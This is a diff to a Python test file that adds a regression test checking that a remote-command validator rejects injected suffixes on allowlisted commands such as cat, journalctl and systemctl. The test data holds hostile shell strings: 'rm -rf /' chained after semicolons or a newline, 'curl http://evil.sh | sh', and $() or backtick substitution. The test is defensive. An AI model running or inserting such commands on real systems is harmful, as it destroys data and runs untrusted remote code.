@@ -61,3 +61,31 @@ def test_blank_command_rejected():
 def test_long_command_rejected():
     with pytest.raises(ValidationAppError):
         validate_remote_command("ls " + "a" * 600)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # Suffix-injection against every allowlisted base command — each of
+        # these previously slipped past the unanchored regexes because
+        # re.match() only pins the *start* of the string.
+        "cat /etc/ssl/x; rm -rf /",
+        "cat /etc/ssl/x && curl http://evil.sh | sh",
+        "cat /etc/ssl/x `id`",
+        "cat /etc/ssl/x $(id)",
+        "ls -la /etc/ssl; rm -rf /",
+        "stat -c %a /etc/ssl/private; rm -rf /",
+        "stat -c %a; rm -rf /",  # missing-path variant of the old ".*" bypass
+        "journalctl -u nginx; rm -rf /",
+        "journalctl -u nginx && curl http://evil.sh | sh",
+        "tail -n 200 /var/log/nginx; rm -rf /",
+        "tail -n 200 /var/log/apache2 && curl http://evil.sh | sh",
+        "systemctl restart nginx; rm -rf /",
+        "systemctl status nginx\nrm -rf /",
+        "whoami; rm -rf /",
+        "df -h; rm -rf /",
+    ],
+)
+def test_command_suffix_injection_rejected(command):
+    with pytest.raises(ValidationAppError):
+        validate_remote_command(command)
